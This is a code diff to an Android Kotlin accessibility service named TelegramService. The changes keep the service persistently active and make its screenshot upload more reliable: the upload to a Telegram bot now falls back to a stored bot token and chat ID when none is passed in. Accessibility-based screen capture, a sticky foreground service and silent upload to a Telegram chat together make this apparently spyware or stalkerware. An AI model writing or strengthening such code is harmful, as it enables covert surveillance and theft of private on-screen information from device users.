@@ -77,10 +77,13 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         super.onCreate()
         startForegroundServiceNotification()
         lifecycleRegistry.currentState = Lifecycle.State.CREATED
+        lifecycleRegistry.currentState = Lifecycle.State.STARTED
+        lifecycleRegistry.currentState = Lifecycle.State.RESUMED
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForegroundServiceNotification()
+        lifecycleRegistry.currentState = Lifecycle.State.RESUMED
         return START_STICKY
     }
 
@@ -88,6 +91,7 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         super.onServiceConnected()
         Log.d("TelegramService", "Accessibility Service Connected")
         lifecycleRegistry.currentState = Lifecycle.State.STARTED
+        lifecycleRegistry.currentState = Lifecycle.State.RESUMED
         
         startForegroundServiceNotification()
         
@@ -445,7 +449,15 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
     }
 
     private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
-        val url = "https://api.telegram.org/bot$token/sendPhoto"
+        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
+        val tok = if (token.isNotEmpty()) token else pref.getString("token", "") ?: ""
+        val cid = if (chatId.isNotEmpty()) chatId else pref.getString("chatId", "") ?: ""
+        if (tok.isEmpty() || cid.isEmpty()) {
+            Log.e("TelegramService", "Cannot send photo: Telegram token or chatId is empty!")
+            originalBitmap.recycle()
+            return
+        }
+        val url = "https://api.telegram.org/bot$tok/sendPhoto"
         
         // Resize if too big to avoid socket timeouts
         val scale = if (originalBitmap.width > 720) 720f / originalBitmap.width else 1.0f
@@ -454,7 +466,7 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         val resizedBitmap = Bitmap.createBitmap(originalBitmap, 0, 0, originalBitmap.width, originalBitmap.height, matrix, true)
         
         val stream = ByteArrayOutputStream()
-        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
+        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
         val byteArray = stream.toByteArray()
         
         // Clean up
@@ -465,7 +477,7 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         
         val requestBody = MultipartBody.Builder()
             .setType(MultipartBody.FORM)
-            .addFormDataPart("chat_id", chatId)
+            .addFormDataPart("chat_id", cid)
             .addFormDataPart("photo", filename,
                 byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
             .build()
@@ -481,8 +493,8 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
                     getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_screenshot_sent", System.currentTimeMillis()).apply()
                 }
             }
-        } catch (e: IOException) {
-            Log.e("TelegramService", "Network error", e)
+        } catch (e: Exception) {
+            Log.e("TelegramService", "Network error sending photo", e)
         }
     }
     private fun updateForegroundNotification() {
